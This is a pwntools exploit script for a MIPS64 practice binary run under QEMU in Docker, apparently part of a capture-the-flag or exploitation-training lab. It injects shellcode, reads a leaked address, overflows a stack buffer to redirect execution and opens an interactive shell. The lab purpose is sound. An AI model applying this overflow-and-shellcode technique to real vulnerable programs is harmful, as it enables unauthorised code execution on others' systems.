from pwn import *
from lib_shellcode import mips_shellcode


# initialize the binary
build = 'mips64r2-glibc-n64'
binary = "mips64r2_static_n64"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa64r2
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
shellcode = mips_shellcode(context, n32=False)

# send shellcode + padding
p.send(shellcode+b'a'*(0x100-len(shellcode)))

shellcode_addr = int(p.readline().strip(),16)
print(f'shellcode(): {hex(shellcode_addr)}')

payload = flat(
    b'a'*0x38,
    p64(shellcode_addr)
)
p.send(payload)
p.interactive()
p.close()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)